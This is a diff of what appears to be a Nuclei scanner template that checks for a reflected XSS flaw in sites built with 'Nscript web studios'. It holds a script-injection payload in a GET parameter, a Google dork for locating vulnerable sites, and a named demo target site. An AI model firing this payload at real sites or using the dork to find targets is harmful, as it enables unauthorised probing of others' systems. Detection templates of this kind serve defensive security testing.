@@ -1,16 +1,14 @@
-id: nscript-xss
-
+id: Nscript XSS
 info:
   name: Nscript web studios XSS vulnerability
-  author: h0tak88r 
+  author: pikpikcu
   severity: medium
   #Category: webapps
   #Google Dork: "Powered by : Nscript web studios"
   #Vendor Homepage: nscript.com
   #Software Link: https://nscript.com/portfolio
   #Demo Target: http://apjsingapore.com
-
-http:
+requests:
   - method: GET
     path:
       - '{{BaseURL}}/bollywood.php?s="><script>alert(document.domain)</script>'
